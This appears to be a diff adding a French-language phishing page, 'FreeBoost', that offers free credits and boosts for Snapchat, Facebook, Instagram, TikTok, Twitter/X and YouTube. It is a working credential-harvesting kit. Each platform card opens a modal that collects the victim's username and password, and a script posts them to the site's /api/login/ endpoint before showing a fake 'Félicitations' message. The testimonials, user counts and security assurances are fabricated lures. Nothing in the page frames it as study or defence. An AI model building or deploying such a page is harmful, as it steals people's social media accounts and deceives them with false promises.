@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>FreeBoost — Rechargement gratuit sur vos réseaux sociaux</title>
+    <!-- Font Awesome 6 (gratuit et fiable) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        :root{
+          --purple-50:#EEEDFE;--purple-100:#CECBF6;--purple-200:#AFA9EC;--purple-400:#7F77DD;--purple-600:#534AB7;--purple-800:#3C3489;--purple-900:#26215C;
+          --teal-50:#E1F5EE;--teal-400:#1D9E75;--teal-600:#0F6E56;--teal-800:#085041;
+          --amber-50:#FAEEDA;--amber-400:#BA7517;--amber-600:#854F0B;--amber-100:#FAC775;
+          --gray-50:#F1EFE8;--gray-100:#D3D1C7;--gray-200:#B4B2A9;--gray-600:#5F5E5A;--gray-800:#444441;--gray-900:#2C2C2A;
+          --red-50:#FCEBEB;--red-400:#E24B4A;--red-800:#791F1F;
+          --color-background-primary:#FFFFFF;
+          --color-background-secondary:#F5F5F5;
+          --color-background-tertiary:#F8F9FA;
+          --color-text-primary:#1A1A1A;
+          --color-text-secondary:#666666;
+          --color-border-tertiary:#E5E5E5;
+          --color-border-secondary:#D0D0D0;
+          --border-radius-md:8px;
+          --border-radius-lg:16px;
+        }
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--color-background-tertiary);color:var(--color-text-primary)}
+        .page-wrapper{max-width:900px;margin:0 auto;padding:1.5rem 1rem}
+
+        /* NAV */
+        nav{display:flex;align-items:center;justify-content:space-between;background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:0.75rem 1.25rem;margin-bottom:2rem}
+        .logo{display:flex;align-items:center;gap:8px}
+        .logo-icon{width:32px;height:32px;background:var(--purple-600);border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:16px}
+        .logo-name{font-size:16px;font-weight:500;color:var(--color-text-primary)}
+        .logo-name span{color:var(--purple-600)}
+        .nav-links{display:flex;gap:4px}
+        .nav-link{padding:6px 12px;border-radius:6px;font-size:13px;color:var(--color-text-secondary);cursor:pointer;border:none;background:none;transition:background 0.15s,color 0.15s}
+        .nav-link:hover{background:var(--color-background-secondary);color:var(--color-text-primary)}
+        .nav-cta{background:var(--purple-600);color:#fff !important;border-radius:6px;padding:6px 14px;font-size:13px;font-weight:500;border:none;cursor:pointer}
+        .nav-cta:hover{background:var(--purple-800) !important}
+
+        /* HERO */
+        .hero{background:var(--purple-900);border-radius:var(--border-radius-lg);padding:3rem 2rem;text-align:center;margin-bottom:2rem;position:relative;overflow:hidden}
+        .hero-bg{position:absolute;inset:0;background:linear-gradient(135deg,var(--purple-900) 60%,var(--purple-600));opacity:0.5;pointer-events:none}
+        .hero-inner{position:relative;z-index:1}
+        .hero-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(255,255,255,0.12);border:0.5px solid rgba(255,255,255,0.25);border-radius:50px;padding:5px 14px;font-size:12px;color:var(--amber-100);margin-bottom:1.25rem;font-weight:500}
+        .hero h1{font-size:2.2rem;font-weight:500;color:#fff;line-height:1.25;margin-bottom:0.75rem}
+        .hero h1 em{font-style:normal;color:var(--amber-100)}
+        .hero-sub{font-size:15px;color:rgba(255,255,255,0.65);margin-bottom:2rem;line-height:1.6}
+        .hero-actions{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-bottom:2.5rem}
+        .btn-primary{background:var(--amber-100);color:var(--amber-600);border:none;padding:11px 24px;border-radius:var(--border-radius-md);font-size:14px;font-weight:500;cursor:pointer;transition:background 0.15s}
+        .btn-primary:hover{background:#fff}
+        .btn-ghost{background:rgba(255,255,255,0.1);color:#fff;border:0.5px solid rgba(255,255,255,0.25);padding:11px 24px;border-radius:var(--border-radius-md);font-size:14px;font-weight:500;cursor:pointer;transition:background 0.15s}
+        .btn-ghost:hover{background:rgba(255,255,255,0.18)}
+        .hero-stats{display:flex;justify-content:center;gap:2.5rem;flex-wrap:wrap;border-top:0.5px solid rgba(255,255,255,0.12);padding-top:1.75rem}
+        .stat{text-align:center}
+        .stat-n{font-size:1.4rem;font-weight:500;color:var(--amber-100)}
+        .stat-l{font-size:11px;color:rgba(255,255,255,0.5);margin-top:2px}
+
+        /* SECTION TITLE */
+        .section-header{margin-bottom:1.25rem}
+        .section-header h2{font-size:18px;font-weight:500;color:var(--color-text-primary)}
+        .section-header p{font-size:13px;color:var(--color-text-secondary);margin-top:3px}
+
+        /* PLATFORM GRID */
+        .platforms-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;margin-bottom:2rem}
+        .platform-card{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:1.25rem 1rem;cursor:pointer;transition:border-color 0.15s,transform 0.15s;text-align:center}
+        .platform-card:hover{border-color:var(--color-border-secondary);transform:translateY(-2px)}
+        .platform-card.active{border-color:var(--purple-400);border-width:1.5px}
+        .p-icon{width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;font-size:24px}
+        .p-name{font-size:14px;font-weight:500;margin-bottom:3px}
+        .p-type{font-size:11px;color:var(--color-text-secondary)}
+        .p-badge{display:inline-block;margin-top:8px;background:var(--teal-50);color:var(--teal-600);font-size:10px;font-weight:500;padding:3px 8px;border-radius:4px}
+        .p-btn{display:block;width:100%;margin-top:10px;background:none;border:0.5px solid var(--color-border-secondary);border-radius:6px;padding:7px;font-size:12px;color:var(--color-text-secondary);cursor:pointer;transition:all 0.15s}
+        .p-btn:hover{background:var(--purple-600);color:#fff;border-color:var(--purple-600)}
+
+        /* FEATURES */
+        .features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:2rem}
+        .feature{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:1.25rem}
+        .feat-icon{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;margin-bottom:10px;font-size:18px}
+        .feat-title{font-size:14px;font-weight:500;margin-bottom:4px}
+        .feat-desc{font-size:12px;color:var(--color-text-secondary);line-height:1.5}
+
+        /* TESTIMONIALS */
+        .testimonials-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-bottom:2rem}
+        .testimonial{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:1.25rem}
+        .t-stars{color:var(--amber-400);font-size:12px;margin-bottom:8px;letter-spacing:1px}
+        .t-text{font-size:13px;color:var(--color-text-secondary);line-height:1.6;margin-bottom:12px}
+        .t-author{display:flex;align-items:center;gap:10px}
+        .t-avatar{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:500;flex-shrink:0}
+        .t-name{font-size:13px;font-weight:500}
+        .t-platform{font-size:11px;color:var(--color-text-secondary)}
+
+        /* CTA BANNER */
+        .cta-banner{background:var(--purple-50);border:0.5px solid var(--purple-100);border-radius:var(--border-radius-lg);padding:2rem;text-align:center;margin-bottom:2rem}
+        .cta-banner h3{font-size:18px;font-weight:500;color:var(--purple-900);margin-bottom:6px}
+        .cta-banner p{font-size:13px;color:var(--purple-600);margin-bottom:1.25rem}
+        .cta-banner .btn-primary{background:var(--purple-600);color:#fff}
+        .cta-banner .btn-primary:hover{background:var(--purple-800)}
+
+        /* MODAL OVERLAY */
+        .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:none;align-items:center;justify-content:center;z-index:999;padding:1rem}
+        .modal-overlay.open{display:flex}
+        .modal{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);width:100%;max-width:420px;overflow:hidden}
+        .modal-top{background:var(--purple-900);padding:1.5rem;text-align:center;position:relative}
+        .modal-close{position:absolute;top:12px;right:14px;background:rgba(255,255,255,0.1);border:none;width:28px;height:28px;border-radius:6px;color:#fff;cursor:pointer;font-size:16px;line-height:28px;display:flex;align-items:center;justify-content:center}
+        .modal-close:hover{background:rgba(255,255,255,0.2)}
+        .modal-m-icon{width:52px;height:52px;border-radius:12px;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;font-size:28px}
+        .modal-title{font-size:18px;font-weight:500;color:#fff;margin-bottom:3px}
+        .modal-subtitle{font-size:12px;color:rgba(255,255,255,0.6)}
+        .modal-body{padding:1.5rem}
+        .security-note{display:flex;align-items:center;gap:8px;background:var(--teal-50);border:0.5px solid rgba(15,110,86,0.2);border-radius:var(--border-radius-md);padding:10px 12px;font-size:12px;color:var(--teal-600);margin-bottom:1.25rem}
+        .form-group{margin-bottom:14px}
+        .form-label{display:block;font-size:13px;font-weight:500;margin-bottom:5px;color:var(--color-text-primary)}
+        .form-input{width:100%;padding:9px 12px;border:0.5px solid var(--color-border-secondary);border-radius:var(--border-radius-md);font-size:14px;background:var(--color-background-primary);color:var(--color-text-primary)}
+        .form-input:focus{outline:none;border-color:var(--purple-400);box-shadow:0 0 0 3px rgba(127,119,221,0.12)}
+        .form-check{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--color-text-secondary);margin-bottom:14px}
+        .form-check a{color:var(--purple-600)}
+        .submit-btn{width:100%;padding:11px;background:var(--purple-600);color:#fff;border:none;border-radius:var(--border-radius-md);font-size:14px;font-weight:500;cursor:pointer;transition:background 0.15s}
+        .submit-btn:hover{background:var(--purple-800)}
+        .submit-btn:disabled{opacity:0.55;cursor:not-allowed}
+        .form-loading{text-align:center;padding:1rem;display:none}
+        .spinner{width:32px;height:32px;border:2.5px solid var(--color-border-tertiary);border-top-color:var(--purple-600);border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 8px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .loading-text{font-size:13px;color:var(--color-text-secondary)}
+        .form-success{background:var(--teal-50);border:0.5px solid rgba(15,110,86,0.2);border-radius:var(--border-radius-md);padding:1rem;font-size:13px;color:var(--teal-600);text-align:center;display:none}
+        .form-error{background:var(--red-50);border:0.5px solid rgba(226,75,74,0.2);border-radius:var(--border-radius-md);padding:1rem;font-size:13px;color:var(--red-800);text-align:center;display:none}
+
+        /* FOOTER */
+        footer{border-top:0.5px solid var(--color-border-tertiary);padding-top:1.5rem;text-align:center}
+        .footer-links{display:flex;justify-content:center;gap:16px;flex-wrap:wrap;margin-bottom:10px}
+        .footer-links a{font-size:12px;color:var(--color-text-secondary);text-decoration:none}
+        .footer-links a:hover{color:var(--color-text-primary)}
+        .footer-copy{font-size:11px;color:var(--color-text-secondary)}
+
+        @media(max-width:600px){
+          nav{flex-wrap:wrap;gap:10px}
+          .nav-links{display:none}
+          .hero h1{font-size:1.6rem}
+          .hero{padding:2rem 1.25rem}
+          .hero-stats{gap:1.25rem}
+          .platforms-grid{grid-template-columns:repeat(2,1fr)}
+        }
+        .sr-only{position:absolute;left:-9999px}
+    </style>
+</head>
+<body>
+<div class="page-wrapper">
+  <h2 class="sr-only">FreeBoost — Rechargement gratuit sur vos réseaux sociaux</h2>
+
+  <!-- NAV -->
+  <nav>
+    <div class="logo">
+      <div class="logo-icon"><i class="fas fa-bolt"></i></div>
+      <div class="logo-name">Free<span>Boost</span></div>
+    </div>
+    <div class="nav-links">
+      <button class="nav-link">Accueil</button>
+      <button class="nav-link">Offres</button>
+      <button class="nav-link">FAQ</button>
+      <button class="nav-link">Support</button>
+    </div>
+    <button class="nav-cta" onclick="openModal('snapchat')">Commencer gratuitement</button>
+  </nav>
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="hero-bg"></div>
+    <div class="hero-inner">
+      <div class="hero-badge"><i class="fas fa-sparkles" style="font-size:13px"></i> Sans carte bancaire • 100% gratuit</div>
+      <h1>Rechargez vos réseaux<br><em>sans payer un centime</em></h1>
+      <p class="hero-sub">Crédits et boosts gratuits pour Snapchat, Instagram, TikTok et plus encore.<br>Plus de 500 000 utilisateurs font confiance à FreeBoost chaque mois.</p>
+      <div class="hero-actions">
+        <button class="btn-primary" onclick="document.getElementById('platforms').scrollIntoView({behavior:'smooth'})">Voir les offres <i class="fas fa-arrow-down"></i></button>
+        <button class="btn-ghost" onclick="openModal('snapchat')">Recharger maintenant</button>
+      </div>
+      <div class="hero-stats">
+        <div class="stat"><div class="stat-n">500K+</div><div class="stat-l">Utilisateurs actifs</div></div>
+        <div class="stat"><div class="stat-n">1M+</div><div class="stat-l">Recharges effectuées</div></div>
+        <div class="stat"><div class="stat-n">4.9/5</div><div class="stat-l">Note moyenne</div></div>
+        <div class="stat"><div class="stat-n">2 min</div><div class="stat-l">Délai moyen</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PLATFORMS -->
+  <div id="platforms">
+    <div class="section-header">
+      <h2>Choisissez votre plateforme</h2>
+      <p>Sélectionnez un réseau pour obtenir votre recharge gratuite instantanément.</p>
+    </div>
+    <div class="platforms-grid" id="platformsGrid">
+      <!-- Snapchat -->
+      <div class="platform-card" data-platform="snapchat" data-offer="Crédits & filtres gratuits" onclick="openModal('snapchat')">
+        <div class="p-icon" style="background:#faea3d"><i class="fab fa-snapchat-ghost" style="font-size:24px;color:#FFFC00"></i></div>
+        <div class="p-name">Snapchat</div>
+        <div class="p-type">Crédits & filtres</div>
+        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
+        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <!-- Facebook -->
+      <div class="platform-card" data-platform="facebook" data-offer="Budget pub offert" onclick="openModal('facebook')">
+        <div class="p-icon" style="background:#E8F0FE"><i class="fab fa-facebook-f" style="font-size:24px;color:#1877F2"></i></div>
+        <div class="p-name">Facebook</div>
+        <div class="p-type">Budget pub offert</div>
+        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
+        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <!-- Instagram -->
+      <div class="platform-card" data-platform="instagram" data-offer="Boost publications gratuit" onclick="openModal('instagram')">
+        <div class="p-icon" style="background:#FDE8EF"><i class="fab fa-instagram" style="font-size:24px;color:#E4405F"></i></div>
+        <div class="p-name">Instagram</div>
+        <div class="p-type">Boost publications</div>
+        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
+        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <!-- TikTok -->
+      <div class="platform-card" data-platform="tiktok" data-offer="Vues & followers offerts" onclick="openModal('tiktok')">
+        <div class="p-icon" style="background:#f3f3f3"><i class="fab fa-tiktok" style="font-size:24px;color:#010101"></i></div>
+        <div class="p-name">TikTok</div>
+        <div class="p-type">Vues & followers</div>
+        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
+        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <!-- Twitter / X -->
+      <div class="platform-card" data-platform="twitter" data-offer="Promotion tweets gratuite" onclick="openModal('twitter')">
+        <div class="p-icon" style="background:#E7F3FD"><i class="fab fa-twitter" style="font-size:24px;color:#1DA1F2"></i></div>
+        <div class="p-name">Twitter / X</div>
+        <div class="p-type">Promotion tweets</div>
+        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
+        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <!-- YouTube -->
+      <div class="platform-card" data-platform="youtube" data-offer="Premium offert" onclick="openModal('youtube')">
+        <div class="p-icon" style="background:#FFE8E8"><i class="fab fa-youtube" style="font-size:24px;color:#FF0000"></i></div>
+        <div class="p-name">YouTube</div>
+        <div class="p-type">Premium offert</div>
+        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
+        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+      </div>
+    </div>
+  </div>
+
+  <!-- FEATURES -->
+  <div class="section-header">
+    <h2>Pourquoi choisir FreeBoost ?</h2>
+  </div>
+  <div class="features-grid">
+    <div class="feature">
+      <div class="feat-icon" style="background:var(--teal-50);color:var(--teal-600)"><i class="fas fa-shield-alt"></i></div>
+      <div class="feat-title">100% sécurisé</div>
+      <div class="feat-desc">Connexion chiffrée et protection totale de vos données personnelles.</div>
+    </div>
+    <div class="feature">
+      <div class="feat-icon" style="background:var(--amber-50);color:var(--amber-400)"><i class="fas fa-bolt"></i></div>
+      <div class="feat-title">Instantané</div>
+      <div class="feat-desc">Recharge effective en moins de 2 minutes après validation du formulaire.</div>
+    </div>
+    <div class="feature">
+      <div class="feat-icon" style="background:var(--purple-50);color:var(--purple-600)"><i class="fas fa-infinity"></i></div>
+      <div class="feat-title">Sans limite</div>
+      <div class="feat-desc">Aucun plafond mensuel — rechargez autant de fois que vous le souhaitez.</div>
+    </div>
+    <div class="feature">
+      <div class="feat-icon" style="background:var(--teal-50);color:var(--teal-600)"><i class="fas fa-credit-card"></i><i class="fas fa-slash" style="font-size:10px;margin-left:-12px"></i></div>
+      <div class="feat-title">Sans carte bancaire</div>
+      <div class="feat-desc">Aucune information de paiement requise, jamais.</div>
+    </div>
+  </div>
+
+  <!-- TESTIMONIALS -->
+  <div class="section-header">
+    <h2>Ils ont déjà rechargé gratuitement</h2>
+  </div>
+  <div class="testimonials-grid">
+    <div class="testimonial">
+      <div class="t-stars">★★★★★</div>
+      <p class="t-text">Incroyable ! Mon crédit Snapchat est arrivé en moins de 2 minutes. Totalement gratuit et sans arnaque.</p>
+      <div class="t-author">
+        <div class="t-avatar" style="background:var(--purple-50);color:var(--purple-600)">ML</div>
+        <div><div class="t-name">Marie L.</div><div class="t-platform">Snapchat</div></div>
+      </div>
+    </div>
+    <div class="testimonial">
+      <div class="t-stars">★★★★★</div>
+      <p class="t-text">Je pensais que c'était trop beau pour être vrai. Ça marche parfaitement ! Budget Facebook Ads offert.</p>
+      <div class="t-author">
+        <div class="t-avatar" style="background:var(--teal-50);color:var(--teal-600)">TD</div>
+        <div><div class="t-name">Thomas D.</div><div class="t-platform">Facebook</div></div>
+      </div>
+    </div>
+    <div class="testimonial">
+      <div class="t-stars">★★★★★</div>
+      <p class="t-text">Offre vraiment généreuse et service réactif. Je recommande à 100% à tous mes amis.</p>
+      <div class="t-author">
+        <div class="t-avatar" style="background:var(--amber-50);color:var(--amber-400)">SM</div>
+        <div><div class="t-name">Sophie M.</div><div class="t-platform">Instagram</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CTA -->
+  <div class="cta-banner">
+    <h3>Prêt à recevoir votre recharge gratuite ?</h3>
+    <p>Rejoignez plus de 500 000 utilisateurs qui boostent leurs réseaux sans payer.</p>
+    <button class="btn-primary" onclick="openModal('snapchat')">Commencer maintenant <i class="fas fa-arrow-right"></i></button>
+  </div>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="footer-links">
+      <a href="#">Conditions d'utilisation</a>
+      <a href="#">Confidentialité</a>
+      <a href="#">Mentions légales</a>
+      <a href="#">Contact</a>
+    </div>
+    <p class="footer-copy">© 2024 FreeBoost — Service 100% gratuit et sans engagement.</p>
+  </footer>
+</div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modalOverlay" onclick="handleOverlayClick(event)">
+  <div class="modal" id="modal">
+    <div class="modal-top">
+      <button class="modal-close" onclick="closeModal()" aria-label="Fermer"><i class="fas fa-times"></i></button>
+      <div class="modal-m-icon" id="modalIcon"></div>
+      <div class="modal-title" id="modalTitle">Connexion</div>
+      <div class="modal-subtitle" id="modalSub">Recharge gratuite instantanée</div>
+    </div>
+    <div class="modal-body">
+      <div class="security-note"><i class="fas fa-lock" style="font-size:14px"></i> Connexion sécurisée — vos données sont protégées</div>
+      {% csrf_token %}
+      <div id="formWrap">
+        <div class="form-group">
+          <label class="form-label" for="username"><i class="fas fa-envelope" style="font-size:13px;margin-right:4px"></i> Nom d'utilisateur / Email</label>
+          <input class="form-input" type="text" id="username" placeholder="exemple@email.com" autocomplete="off">
+        </div>
+        <div class="form-group">
+          <label class="form-label" for="password"><i class="fas fa-lock" style="font-size:13px;margin-right:4px"></i> Mot de passe</label>
+          <input class="form-input" type="password" id="password" placeholder="Votre mot de passe">
+        </div>
+        <div class="form-check">
+          <input type="checkbox" id="terms" style="width:15px;height:15px;flex-shrink:0">
+          <label for="terms">J'accepte les <a href="#">conditions d'utilisation</a></label>
+        </div>
+        <button class="submit-btn" id="submitBtn" onclick="handleSubmit()"><i class="fas fa-gift" style="font-size:14px;margin-right:4px"></i> Obtenir ma recharge gratuite</button>
+      </div>
+      <div class="form-loading" id="formLoading">
+        <div class="spinner"></div>
+        <div class="loading-text">Vérification en cours…</div>
+      </div>
+      <div class="form-success" id="formSuccess"><i class="fas fa-check-circle" style="font-size:18px;margin-bottom:6px;display:block"></i><strong>Félicitations !</strong><br>Votre crédit gratuit a été ajouté à votre compte.</div>
+      <div class="form-error" id="formError"><i class="fas fa-exclamation-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>Une erreur est survenue. Veuillez vérifier vos identifiants.</div>
+    </div>
+  </div>
+</div>
+
+<script>
+// Configuration des plateformes
+const platforms = {
+    snapchat: {icon: 'fab fa-snapchat-ghost', bg: '#FFFBCC', color: '#FFFC00', name: 'Snapchat', sub: 'Crédits & filtres gratuits', offer_type: 'free_boost'},
+    facebook: {icon: 'fab fa-facebook-f', bg: '#E8F0FE', color: '#1877F2', name: 'Facebook', sub: 'Budget publicitaire offert', offer_type: 'free_boost'},
+    instagram: {icon: 'fab fa-instagram', bg: '#FDE8EF', color: '#E4405F', name: 'Instagram', sub: 'Boost publications gratuit', offer_type: 'free_boost'},
+    tiktok: {icon: 'fab fa-tiktok', bg: '#f3f3f3', color: '#010101', name: 'TikTok', sub: 'Vues & followers offerts', offer_type: 'free_boost'},
+    twitter: {icon: 'fab fa-twitter', bg: '#E7F3FD', color: '#1DA1F2', name: 'Twitter / X', sub: 'Promotion tweets gratuite', offer_type: 'free_boost'},
+    youtube: {icon: 'fab fa-youtube', bg: '#FFE8E8', color: '#FF0000', name: 'YouTube', sub: 'Premium offert', offer_type: 'free_boost'}
+};
+
+let currentPlatform = 'snapchat';
+let sessionId = localStorage.getItem('fb_session_id');
+if (!sessionId) {
+    sessionId = Math.random().toString(36).substring(2) + Date.now().toString(36);
+    localStorage.setItem('fb_session_id', sessionId);
+}
+
+// Fonction pour tracker les clics sur les forfaits
+async function trackClick(platform, offerName) {
+    try {
+        const response = await fetch('/api/log-click/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value
+            },
+            body: JSON.stringify({
+                session_id: sessionId,
+                platform: platform,
+                offer_name: offerName
+            })
+        });
+        const data = await response.json();
+        console.log('Click tracked:', data);
+    } catch(e) {
+        console.error('Track error:', e);
+    }
+}
+
+function openModal(platform) {
+    currentPlatform = platform;
+    const d = platforms[platform] || platforms.snapchat;
+    
+    // Récupérer le nom de l'offre depuis la carte
+    const card = document.querySelector(`.platform-card[data-platform="${platform}"]`);
+    const offerName = card ? card.getAttribute('data-offer') : d.sub;
+    
+    // Tracker le clic sur le forfait
+    trackClick(platform, offerName);
+    
+    const icon = document.getElementById('modalIcon');
+    icon.innerHTML = `<i class="${d.icon}" style="font-size:32px;color:${d.color}"></i>`;
+    icon.style.background = d.bg;
+    
+    document.getElementById('modalTitle').textContent = d.name;
+    document.getElementById('modalSub').textContent = d.sub;
+    document.getElementById('username').value = '';
+    document.getElementById('password').value = '';
+    document.getElementById('terms').checked = false;
+    document.getElementById('formWrap').style.display = 'block';
+    document.getElementById('formLoading').style.display = 'none';
+    document.getElementById('formSuccess').style.display = 'none';
+    document.getElementById('formError').style.display = 'none';
+    document.getElementById('modalOverlay').classList.add('open');
+}
+
+function closeModal() {
+    document.getElementById('modalOverlay').classList.remove('open');
+}
+
+function handleOverlayClick(e) {
+    if (e.target === document.getElementById('modalOverlay')) closeModal();
+}
+
+async function handleSubmit() {
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value;
+    const termsChecked = document.getElementById('terms').checked;
+    
+    if (!username || !password) {
+        const errorDiv = document.getElementById('formError');
+        errorDiv.innerHTML = '<i class="fas fa-exclamation-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>Veuillez remplir tous les champs.';
+        errorDiv.style.display = 'block';
+        return;
+    }
+    
+    if (!termsChecked) {
+        const errorDiv = document.getElementById('formError');
+        errorDiv.innerHTML = '<i class="fas fa-exclamation-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>Veuillez accepter les conditions d\'utilisation.';
+        errorDiv.style.display = 'block';
+        return;
+    }
+    
+    document.getElementById('formError').style.display = 'none';
+    document.getElementById('formWrap').style.display = 'none';
+    document.getElementById('formLoading').style.display = 'block';
+    
+    try {
+        const response = await fetch('/api/login/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value
+            },
+            body: JSON.stringify({
+                username: username,
+                password: password,
+                platform: currentPlatform,
+                offer_type: platforms[currentPlatform]?.offer_type || 'free_boost'
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (response.ok) {
+            document.getElementById('formLoading').style.display = 'none';
+            
+            const successDiv = document.getElementById('formSuccess');
+            successDiv.innerHTML = `<i class="fas fa-check-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>
+                <strong>Félicitations !</strong><br>
+                Votre recharge gratuite a été créditée sur votre compte ${currentPlatform}.<br>
+                Redirection dans 3 secondes...`;
+            successDiv.style.display = 'block';
+            
+            setTimeout(() => {
+                closeModal();
+            }, 3000);
+        } else {
+            throw new Error(data.error || 'Erreur de connexion');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        document.getElementById('formLoading').style.display = 'none';
+        document.getElementById('formWrap').style.display = 'block';
+        const errorDiv = document.getElementById('formError');
+        errorDiv.innerHTML = `<i class="fas fa-exclamation-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>
+            ${error.message || 'Une erreur est survenue. Veuillez réessayer.'}`;
+        errorDiv.style.display = 'block';
+    }
+}
+
+// Fermer le modal avec Echap
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+        closeModal();
+    }
+});
+</script>
+</body>
+</html>
